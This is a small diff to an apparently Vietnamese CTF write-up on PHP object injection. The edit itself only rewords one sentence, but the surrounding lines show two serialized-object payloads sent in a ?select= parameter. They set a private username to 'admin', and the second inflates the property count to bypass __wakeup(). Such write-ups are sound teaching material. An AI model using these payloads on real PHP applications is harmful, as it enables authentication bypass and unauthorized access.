@@ -99,7 +99,7 @@ Payload ban đầu của mình:
 `?select=O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
 - ở đây, vì hai biến `username` và `password` mang thuộc tính private, nên mình dùng `%00` điền vào trước chuỗi để khi truy xuất vào được đầy đủ.
  
-Và để vượt qua function `__wakeup()` thì mình đã payload một chút:
+Và để vượt qua function `__wakeup()` thì mình đã thay đổi một chút:
 
 `?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
 
